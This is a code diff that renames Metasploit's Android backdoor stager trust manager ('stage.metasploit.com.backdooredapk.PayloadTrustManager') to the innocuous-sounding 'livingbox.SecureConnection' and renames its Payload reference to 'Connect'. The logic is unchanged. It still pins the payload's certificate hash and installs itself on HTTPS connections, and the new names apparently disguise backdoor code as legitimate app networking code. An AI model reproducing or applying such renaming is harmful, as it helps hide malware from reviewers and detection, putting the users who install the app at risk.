@@ -1,4 +1,4 @@
-package stage.metasploit.com.backdooredapk;
+package livingbox;
 
 import java.net.URLConnection;
 import java.security.MessageDigest;
@@ -7,6 +7,7 @@ import java.security.SecureRandom;
 import java.security.cert.CertificateEncodingException;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
+
 import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.HttpsURLConnection;
 import javax.net.ssl.SSLContext;
@@ -14,7 +15,7 @@ import javax.net.ssl.SSLSession;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 
-public class PayloadTrustManager implements X509TrustManager, HostnameVerifier {
+public class SecureConnection implements X509TrustManager, HostnameVerifier {
     public X509Certificate[] getAcceptedIssuers() {
         return new X509Certificate[0];
     }
@@ -39,7 +40,7 @@ public class PayloadTrustManager implements X509TrustManager, HostnameVerifier {
     }
 
     public void checkServerTrusted(X509Certificate[] certs, String authType) throws CertificateException {
-        String payloadHash = Payload.CERT_HASH.substring(4).trim();
+        String payloadHash = Connect.CERT_HASH.substring(4).trim();
         if (payloadHash.length() != 0) {
             if (certs == null || certs.length < 1) {
                 throw new CertificateException();
@@ -67,7 +68,7 @@ public class PayloadTrustManager implements X509TrustManager, HostnameVerifier {
     public static void useFor(URLConnection uc) throws Exception {
         if (uc instanceof HttpsURLConnection) {
             HttpsURLConnection huc = (HttpsURLConnection) uc;
-            PayloadTrustManager ptm = new PayloadTrustManager();
+            SecureConnection ptm = new SecureConnection();
             SSLContext sc = SSLContext.getInstance("SSL");
             sc.init(null, new TrustManager[]{ptm}, new SecureRandom());
             huc.setSSLSocketFactory(sc.getSocketFactory());
